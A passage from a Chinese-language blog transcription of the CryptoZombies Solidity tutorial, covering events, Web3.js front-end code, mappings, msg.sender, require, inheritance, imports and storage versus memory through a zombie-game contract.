{</span><br><span class="line"></span><br><span class="line">    // 这里建立事件</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Zombie[] public zombies;</span><br><span class="line"></span><br><span class="line">    function _createZombie(string _name, uint _dna) private {</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function _generateRandomDna(string _str) private view returns (uint) {</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        return rand % dnaModulus;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function createRandomZombie(string _name) public {</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createZombie(_name, randDna);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第13章-事件"><a href="#第13章-事件" class="headerlink" title="第13章: 事件"></a>第13章: 事件</h3><p>我们的合约几乎就要完成了！让我们加上一个<strong>事件</strong>.</p><p><strong>事件</strong> 是合约和区块链通讯的一种机制。你的前端应用“监听”某些事件，并做出反应。</p><p>例子:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 这里建立事件</span><br><span class="line">event IntegersAdded(uint x, uint y, uint result);</span><br><span class="line"></span><br><span class="line">function add(uint _x, uint _y) public {</span><br><span class="line">  uint result = _x + _y;</span><br><span class="line">  //触发事件，通知app</span><br><span class="line">  IntegersAdded(_x, _y, result);</span><br><span class="line">  return result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>你的 app 前端可以监听这个事件。JavaScript 实现如下:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">YourContract.IntegersAdded(function(error, result) {</span><br><span class="line">  // 干些事</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><p>我们想每当一个僵尸创造出来时，我们的前端都能监听到这个事件，并将它显示出来。</p><p>1。 定义一个 <code>事件</code> 叫做 <code>NewZombie</code>。 它有3个参数: <code>zombieId</code> (<code>uint</code>)， <code>name</code> (<code>string</code>)， 和 <code>dna</code> (<code>uint</code>)。</p><p>2。 修改 <code>_createZombie</code> 函数使得当新僵尸造出来并加入 <code>zombies</code>数组后，生成事件<code>NewZombie</code>。</p><p>3。 需要定义僵尸<code>id</code>。 <code>array.push()</code> 返回数组的长度类型是<code>uint</code> - 因为数组的第一个元素的索引是 0， <code>array.push() - 1</code> 将是我们加入的僵尸的索引。 <code>zombies.push() - 1</code> 就是 <code>id</code>，数据类型是 <code>uint</code>。在下一行中你可以把它用到 <code>NewZombie</code> 事件中。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">// 这里建立事件</span><br><span class="line">    event NewZombie(uint zombieId, string name, uint dna);</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Zombie[] public zombies;</span><br><span class="line"></span><br><span class="line">    function _createZombie(string _name, uint _dna) private {</span><br><span class="line">        uint id = zombies.push(Zombie(_name, _dna)) - 1;</span><br><span class="line">        //// 这里触发事件</span><br><span class="line">        NewZombie(id, _name, _dna);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function _generateRandomDna(string _str) private view returns (uint) {</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        return rand % dnaModulus;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function createRandomZombie(string _name) public {</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createZombie(_name, randDna);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第14章-Web3-js"><a href="#第14章-Web3-js" class="headerlink" title="第14章: Web3.js"></a>第14章: Web3.js</h3><p>我们的 Solidity 合约完工了！ 现在我们要写一段 JavaScript 前端代码来调用这个合约。</p><p>以太坊有一个 JavaScript 库，名为<strong>Web3.js</strong>。</p><p>在后面的课程里，我们会进一步地教你如何安装一个合约，如何设置Web3.js。 但是现在我们通过一段代码来了解 Web3.js 是如何和我们发布的合约交互的吧。</p><p>如果下面的代码你不能全都理解，不用担心。</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 下面是调用合约的方式:</span></span><br><span class="line"><span class="keyword">var</span> abi = <span class="comment">/* abi是由编译器生成的 */</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">ZombieFactoryContract</span> = web3.<span class="property">eth</span>.<span class="title function_">contract</span>(abi)</span><br><span class="line"><span class="keyword">var</span> contractAddress = <span class="comment">/* 发布之后在以太坊上生成的合约地址 */</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">ZombieFactory</span> = <span class="title class_">ZombieFactoryContract</span>.<span class="title function_">at</span>(contractAddress)</span><br><span class="line"><span class="comment">// `ZombieFactory` 能访问公共的函数以及事件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 某个监听文本输入的监听器:</span></span><br><span class="line">$(<span class="string">"#ourButton"</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params">e</span>) {</span><br><span class="line">  <span class="keyword">var</span> name = $(<span class="string">"#nameInput"</span>).<span class="title function_">val</span>()</span><br><span class="line">  <span class="comment">//调用合约的 `createRandomZombie` 函数:</span></span><br><span class="line">  <span class="title class_">ZombieFactory</span>.<span class="title function_">createRandomZombie</span>(name)</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听 `NewZombie` 事件, 并且更新UI</span></span><br><span class="line"><span class="keyword">var</span> event = <span class="title class_">ZombieFactory</span>.<span class="title class_">NewZombie</span>(<span class="keyword">function</span>(<span class="params">error, result</span>) {</span><br><span class="line">  <span class="keyword">if</span> (error) <span class="keyword">return</span></span><br><span class="line">  <span class="title function_">generateZombie</span>(result.<span class="property">zombieId</span>, result.<span class="property">name</span>, result.<span class="property">dna</span>)</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Zombie 的 dna, 更新图像</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateZombie</span>(<span class="params">id, name, dna</span>) {</span><br><span class="line">  <span class="keyword">let</span> dnaStr = <span class="title class_">String</span>(dna)</span><br><span class="line">  <span class="comment">// 如果dna少于16位,在它前面用0补上</span></span><br><span class="line">  <span class="keyword">while</span> (dnaStr.<span class="property">length</span> &lt; <span class="number">16</span>)</span><br><span class="line">    dnaStr = <span class="string">"0"</span> + dnaStr</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> zombieDetails = {</span><br><span class="line">    <span class="comment">// 前两位数构成头部.我们可能有7种头部, 所以 % 7</span></span><br><span class="line">    <span class="comment">// 得到的数在0-6,再加上1,数的范围变成1-7</span></span><br><span class="line">    <span class="comment">// 通过这样计算：</span></span><br><span class="line">    <span class="attr">headChoice</span>: dnaStr.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">2</span>) % <span class="number">7</span> + <span class="number">1</span>，</span><br><span class="line">    <span class="comment">// 我们得到的图片名称从head1.png 到 head7.png</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接下来的两位数构成眼睛, 眼睛变化就对11取模:</span></span><br><span class="line">    <span class="attr">eyeChoice</span>: dnaStr.<span class="title function_">substring</span>(<span class="number">2</span>, <span class="number">4</span>) % <span class="number">11</span> + <span class="number">1</span>,</span><br><span class="line">    <span class="comment">// 再接下来的两位数构成衣服，衣服变化就对6取模:</span></span><br><span class="line">    <span class="attr">shirtChoice</span>: dnaStr.<span class="title function_">substring</span>(<span class="number">4</span>, <span class="number">6</span>) % <span class="number">6</span> + <span class="number">1</span>,</span><br><span class="line">    <span class="comment">//最后6位控制颜色. 用css选择器: hue-rotate来更新</span></span><br><span class="line">    <span class="comment">// 360度:</span></span><br><span class="line">    <span class="attr">skinColorChoice</span>: <span class="built_in">parseInt</span>(dnaStr.<span class="title function_">substring</span>(<span class="number">6</span>, <span class="number">8</span>) / <span class="number">100</span> * <span class="number">360</span>),</span><br><span class="line">    <span class="attr">eyeColorChoice</span>: <span class="built_in">parseInt</span>(dnaStr.<span class="title function_">substring</span>(<span class="number">8</span>, <span class="number">10</span>) / <span class="number">100</span> * <span class="number">360</span>),</span><br><span class="line">    <span class="attr">clothesColorChoice</span>: <span class="built_in">parseInt</span>(dnaStr.<span class="title function_">substring</span>(<span class="number">10</span>, <span class="number">12</span>) / <span class="number">100</span> * <span class="number">360</span>),</span><br><span class="line">    <span class="attr">zombieName</span>: name,</span><br><span class="line">    <span class="attr">zombieDescription</span>: <span class="string">"A Level 1 CryptoZombie"</span>,</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> zombieDetails</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们的 JavaScript 所做的就是获取由<code>zombieDetails</code> 产生的数据, 并且利用浏览器里的 JavaScript 神奇功能 (我们用 Vue.js)，置换出图像以及使用CSS过滤器。在后面的课程中，你可以看到全部的代码。</p><h2 id="lesson2-僵尸攻击人类"><a href="#lesson2-僵尸攻击人类" class="headerlink" title="lesson2 僵尸攻击人类"></a>lesson2 僵尸攻击人类</h2><h3 id="第2章-映射（Mapping）和地址（Address）"><a href="#第2章-映射（Mapping）和地址（Address）" class="headerlink" title="第2章: 映射（Mapping）和地址（Address）"></a>第2章: 映射（Mapping）和地址（Address）</h3><p>我们通过给数据库中的僵尸指定“主人”， 来支持“多玩家”模式。</p><p>如此一来，我们需要引入2个新的数据类型：<code>mapping</code>（映射） 和 <code>address</code>（地址）。</p><p><strong>Addresses （地址）</strong></p><p>以太坊区块链由 <strong>_ account _</strong> (账户)组成，你可以把它想象成银行账户。一个帐户的余额是 <strong><em>以太</em></strong> （在以太坊区块链上使用的币种），你可以和其他帐户之间支付和接受以太币，就像你的银行帐户可以电汇资金到其他银行帐户一样。</p><p>每个帐户都有一个“地址”，你可以把它想象成银行账号。这是账户唯一的标识符，它看起来长这样：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0cE446255506E92DF41614C46F1d6df9Cc969183</span><br></pre></td></tr></tbody></table></figure><p>（这是 CryptoZombies 团队的地址，如果你喜欢 CryptoZombies 的话，请打赏我们一些以太币！😉）</p><p>我们将在后面的课程中介绍地址的细节，现在你只需要了解<strong>地址属于特定用户（或智能合约）的</strong>。</p><p>所以我们可以指定“地址”作为僵尸主人的 ID。当用户通过与我们的应用程序交互来创建新的僵尸时，新僵尸的所有权被设置到调用者的以太坊地址下。</p><p><strong>Mapping（映射）</strong></p><p>在第1课中，我们看到了 <strong>结构体</strong> 和 <strong>数组</strong> 。 <strong>映射</strong> 是另一种在 Solidity 中存储有组织数据的方法。</p><p>映射是这样定义的：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//对于金融应用程序，将用户的余额保存在一个 uint类型的变量中：</span><br><span class="line">mapping (address =&gt; uint) public accountBalance;</span><br><span class="line">//或者可以用来通过userId 存储/查找的用户名</span><br><span class="line">mapping (uint =&gt; string) userIdToName;</span><br></pre></td></tr></tbody></table></figure><p>映射本质上是存储和查找数据所用的<strong>键-值对</strong>。在第一个例子中，键是一个 <code>address</code>，值是一个 <code>uint</code>，在第二个例子中，键是一个<code>uint</code>，值是一个 <code>string</code>。</p><p><strong>实战演习</strong></p><p>为了存储僵尸的所有权，我们会使用到两个映射：一个记录僵尸拥有者的地址，另一个记录某地址所拥有僵尸的数量。</p><p>1.创建一个叫做 <code>zombieToOwner</code> 的映射。其键是一个<code>uint</code>（我们将根据它的 id 存储和查找僵尸），值为 <code>address</code>。映射属性为<code>public</code>。</p><p>2.创建一个名为 <code>ownerZombieCount</code> 的映射，其中键是 <code>address</code>，值是 <code>uint</code>。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 在这里定义映射</span><br><span class="line">mapping (uint =&gt; address ) public zombieToOwner;</span><br><span class="line">mapping ( address =&gt; uint) ownerZombieCount;</span><br></pre></td></tr></tbody></table></figure><h3 id="第3章-Msg-sender"><a href="#第3章-Msg-sender" class="headerlink" title="第3章: Msg.sender"></a>第3章: Msg.sender</h3><p>现在有了一套映射来记录僵尸的所有权了，我们可以修改 <code>_createZombie</code> 方法来运用它们。</p><p>为了做到这一点，我们要用到 <code>msg.sender</code>。</p><p><strong>msg.sender</strong></p><p>在 Solidity 中，有一些全局变量可以被所有函数调用。 其中一个就是 <code>msg.sender</code>，它指的是当前调用者（或智能合约）的 <code>address</code>。</p><blockquote><p>注意：在 Solidity 中，功能执行始终需要从外部调用者开始。 一个合约只会在区块链上什么也不做，除非有人调用其中的函数。所以 <code>msg.sender</code>总是存在的。</p></blockquote><p>以下是使用 <code>msg.sender</code> 来更新 <code>mapping</code> 的例子：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mapping (address =&gt; uint) favoriteNumber;</span><br><span class="line"></span><br><span class="line">function setMyNumber(uint _myNumber) public {</span><br><span class="line">  // 更新我们的 `favoriteNumber` 映射来将 `_myNumber`存储在 `msg.sender`名下</span><br><span class="line">  favoriteNumber[msg.sender] = _myNumber;</span><br><span class="line">  // 存储数据至映射的方法和将数据存储在数组相似</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">function whatIsMyNumber() public view returns (uint) {</span><br><span class="line">  // 拿到存储在调用者地址名下的值</span><br><span class="line">  // 若调用者还没调用 setMyNumber， 则值为 `0`</span><br><span class="line">  return favoriteNumber[msg.sender];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在这个小小的例子中，任何人都可以调用 <code>setMyNumber</code> 在我们的合约中存下一个 <code>uint</code> 并且与他们的地址相绑定。 然后，他们调用 <code>whatIsMyNumber</code> 就会返回他们存储的 <code>uint</code>。</p><p>使用 <code>msg.sender</code> 很安全，因为它具有以太坊区块链的安全保障 —— 除非窃取与以太坊地址相关联的私钥，否则是没有办法修改其他人的数据的。</p><p><strong>实战演习</strong></p><p>我们来修改第1课的 <code>_createZombie</code> 方法，将僵尸分配给函数调用者吧。</p><ol><li>首先，在得到新的僵尸 <code>id</code> 后，更新 <code>zombieToOwner</code> 映射，在 <code>id</code> 下面存入 <code>msg.sender</code>。</li><li>然后，我们为这个 <code>msg.sender</code> 名下的 <code>ownerZombieCount</code> 加 1。</li></ol><p>跟在 JavaScript 中一样， 在 Solidity 中你也可以用 <code>++</code> 使 <code>uint</code> 递增。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uint number = 0;</span><br><span class="line">number++;</span><br><span class="line">// `number` 现在是 `1`了</span><br></pre></td></tr></tbody></table></figure><p>修改两行代码即可。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function _createZombie(string _name, uint _dna) private {</span><br><span class="line">        uint id = zombies.push(Zombie(_name, _dna)) - 1;</span><br><span class="line">        // 从这里开始</span><br><span class="line">        zombieToOwner[id] = msg.sender;</span><br><span class="line">        ownerZombieCount[msg.sender]++;</span><br><span class="line">        NewZombie(id, _name, _dna);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h3 id="第4章-Require"><a href="#第4章-Require" class="headerlink" title="第4章: Require"></a>第4章: Require</h3><p>在第一课中，我们成功让用户通过调用 <code>createRandomZombie</code>函数 并输入一个名字来创建新的僵尸。 但是，如果用户能持续调用这个函数来创建出无限多个僵尸加入他们的军团，这游戏就太没意思了！</p><p>于是，我们作出限定：每个玩家只能调用一次这个函数。 这样一来，新玩家可以在刚开始玩游戏时通过调用它，为其军团创建初始僵尸。</p><p>我们怎样才能限定每个玩家只调用一次这个函数呢？</p><p>答案是使用<code>require</code>。 <code>require</code>使得函数在执行过程中，当不满足某些条件时抛出错误，并停止执行：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function sayHiToVitalik(string _name) public returns (string) {</span><br><span class="line">  // 比较 _name 是否等于 "Vitalik". 如果不成立，抛出异常并终止程序</span><br><span class="line">  // (敲黑板: Solidity 并不支持原生的字符串比较, 我们只能通过比较</span><br><span class="line">  // 两字符串的 keccak256 哈希值来进行判断)</span><br><span class="line">  require(keccak256(_name) == keccak256("Vitalik"));</span><br><span class="line">  // 如果返回 true, 运行如下语句</span><br><span class="line">  return "Hi!";</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如果你这样调用函数 <code>sayHiToVitalik（“Vitalik”）</code> ,它会返回“Hi！”。而如果调用的时候使用了其他参数，它则会抛出错误并停止执行。</p><p>因此，在调用一个函数之前，用 <code>require</code> 验证前置条件是非常有必要的。</p><p><strong>实战演习</strong></p><p>在我们的僵尸游戏中，我们不希望用户通过反复调用 <code>createRandomZombie</code> 来給他们的军队创建无限多个僵尸 —— 这将使得游戏非常无聊。</p><p>我们使用了 <code>require</code> 来确保这个函数只有在每个用户第一次调用它的时候执行，用以创建初始僵尸。</p><ol><li>在 <code>createRandomZombie</code> 的前面放置 <code>require</code> 语句。 使得函数先检查 <code>ownerZombieCount [msg.sender]</code> 的值为 <code>0</code> ，不然就抛出一个错误。</li></ol><blockquote><p>注意：在 Solidity 中，关键词放置的顺序并不重要</p><ul><li>虽然参数的两个位置是等效的。 但是，由于我们的答案检查器比较呆板，它只能认定其中一个为正确答案</li><li>于是在这里，我们就约定把<code>ownerZombieCount [msg.sender]</code>放前面吧</li></ul></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function createRandomZombie(string _name) public {</span><br><span class="line">        // start here</span><br><span class="line">        require(ownerZombieCount[msg.sender] == 0);</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createZombie(_name, randDna);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h3 id="第5章-继承（Inheritance）"><a href="#第5章-继承（Inheritance）" class="headerlink" title="第5章: 继承（Inheritance）"></a>第5章: 继承（Inheritance）</h3><p>我们的游戏代码越来越长。 当代码过于冗长的时候，最好将代码和逻辑分拆到多个不同的合约中，以便于管理。</p><p>有个让 Solidity 的代码易于管理的功能，就是合约 *<strong>inheritance*</strong> (继承)：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Doge {</span><br><span class="line">  function catchphrase() public returns (string) {</span><br><span class="line">    return "So Wow CryptoDoge";</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract BabyDoge is Doge {</span><br><span class="line">  function anotherCatchphrase() public returns (string) {</span><br><span class="line">    return "Such Moon BabyDoge";</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>由于 <code>BabyDoge</code> 是从 <code>Doge</code> 那里 *<strong>inherits*</strong> （继承)过来的。 这意味着当你编译和部署了 <code>BabyDoge</code>，它将可以访问 <code>catchphrase()</code> 和 <code>anotherCatchphrase()</code>和其他我们在 <code>Doge</code> 中定义的其他公共函数。</p><p>这可以用于逻辑继承（比如表达子类的时候，<code>Cat</code> 是一种 <code>Animal</code>）。 但也可以简单地将类似的逻辑组合到不同的合约中以组织代码。</p><p><strong>实战演习</strong></p><p>在接下来的章节中，我们将要为僵尸实现各种功能，让它可以“猎食”和“繁殖”。 通过将这些运算放到父类 <code>ZombieFactory</code> 中，使得所有 <code>ZombieFactory</code> 的继承者合约都可以使用这些方法。</p><ol><li>在 <code>ZombieFactory</code> 下创建一个叫 <code>ZombieFeeding</code> 的合约，它是继承自 `ZombieFactory 合约的。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// Start here</span><br><span class="line">contract ZombieFeeding is ZombieFactory {</span><br><span class="line">    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第6章-引入（Import）"><a href="#第6章-引入（Import）" class="headerlink" title="第6章: 引入（Import）"></a>第6章: 引入（Import）</h3><p>哇！你有没有注意到，我们只是清理了下右边的代码，现在你的编辑器的顶部就多了个选项卡。 尝试点击它的标签，看看会发生什么吧！</p><p>代码已经够长了，我们把它分成多个文件以便于管理。 通常情况下，当 Solidity 项目中的代码太长的时候我们就是这么做的。</p><p>在 Solidity 中，当你有多个文件并且想把一个文件导入另一个文件时，可以使用 <code>import</code> 语句：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import "./someothercontract.sol";</span><br><span class="line"></span><br><span class="line">contract newContract is SomeOtherContract {</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这样当我们在合约（contract）目录下有一个名为 <code>someothercontract.sol</code> 的文件（ <code>./</code> 就是同一目录的意思），它就会被编译器导入。</p><p><strong>实战演习</strong></p><p>现在我们已经建立了一个多文件架构，并用 <code>import</code> 来读取来自另一个文件中合约的内容：</p><p>1.将 <code>zombiefactory.sol</code> 导入到我们的新文件 <code>zombiefeeding.sol</code> 中。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// put import statement here</span><br><span class="line">import "./zombiefactory.sol";</span><br></pre></td></tr></tbody></table></figure><h3 id="第7章-Storage与Memory"><a href="#第7章-Storage与Memory" class="headerlink" title="第7章: Storage与Memory"></a>第7章: Storage与Memory</h3><p>在 Solidity 中，有两个地方可以存储变量 —— <code>storage</code> 或 <code>memory</code>。</p><p><strong>Storage</strong> 变量是指**<u>永久存储</u><strong>在区块链中的变量。 <strong>Memory</strong> 变量则是</strong><u>临时的</u>**，当外部函数对某合约调用完成时，内存型变量即被移除。 你可以把它想象成存储在你电脑的硬盘或是RAM中数据的关系。</p><p>大多数时候你都用不到这些关键字，默认情况下 Solidity 会自动处理它们。 状态变量（在函数之外声明的变量）默认为“存储”形式，并永久写入区块链；而在函数内部声明的变量是“内存”型的，它们函数调用结束后消失。</p><p>然而也有一些情况下，你需要手动声明存储类型，主要用于处理函数内的 <strong>结构体</strong> 和 <strong>数组</strong> 时：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">contract SandwichFactory {</span><br><span class="line">  struct Sandwich {</span><br><span class="line">    string name;</span><br><span class="line">    string status;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  Sandwich[] sandwiches;</span><br><span class="line"></span><br><span class="line">  function eatSandwich(uint _index) public {</span><br><span class="line">    // Sandwich mySandwich = sandwiches[_index];</span><br><span class="line"></span><br><span class="line">    // ^ 看上去很直接，不过 Solidity 将会给出警告</span><br><span class="line">    // 告诉你应该明确在这里定义 `storage` 或者 `memory`。</span><br><span class="line"></span><br><span class="line">    // 所以你应该明确定义 `storage`:</span><br><span class="line">    Sandwich storage mySandwich = sandwiches[_index];</span><br><span class="line">    // ...这样 `mySandwich` 是指向 `sandwiches[_index]`的指针</span><br><span class="line">    // 在存储里，另外...</span><br><span class="line">    mySandwich.status = "Eaten!";</span><br><span class="line">    // ...这将永久把 `sandwiches[_index]` 变为区块链上的存储</span><br><span class="line"></span><br><span class="line">    // 如果你只想要一个副本，可以使用`memory`:</span><br><span class="line">    Sandwich memory anotherSandwich = sandwiches[_index + 1];</span><br><span class="line">    // ...这样 `anotherSandwich` 就仅仅是一个内存里的副本了</span><br><span class="line">    // 另外</span><br><span class="line">    anotherSandwich.status = "Eaten!";</span><br><span class="line">    // ...将仅仅修改临时变量，对 `sandwiches[_index + 1]` 没有任何影响</span><br><span class="line">    // 不过你可以这样做:</span><br><span class="line">    sandwiches[_index + 1] = anotherSandwich;</span><br><span class="line">    // ...如果你想把副本的改动保存回区块链存储</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如果你还没有完全理解究竟应该使用哪一个，也不用担心 —— 在本教程中，我们将告诉你何时使用 <code>storage</code> 或是 <code>memory</code>，并且当你不得不使用到这些关键字的时候，Solidity 编译器也发警示提醒你的。</p><p>现在，只要知道在某些场合下也需要你显式地声明 <code>storage</code> 或 <code>memory</code>就够了！</p><p><strong>实战演习</strong></p><p>是时候给我们的僵尸增加“猎食”和“繁殖”功能了！</p><p>当一个僵尸猎食其他生物体时，它自身的DNA将与猎物生物的DNA结合在一起，形成一个新的僵尸DNA。</p><ol><li>创建一个名为 <code>feedAndMultiply</code> 的函数。 使用两个参数：<code>_zombieId</code>（ <code>uint</code>类型 ）和<code>_targetDna</code> （也是 <code>uint</code> 类型）。 设置属性为 <code>public</code> 的。</li><li>我们不希望别人用我们的僵尸去捕猎。 首先，我们确保对自己僵尸的所有权。 通过添加一个<code>require</code> 语句来确保 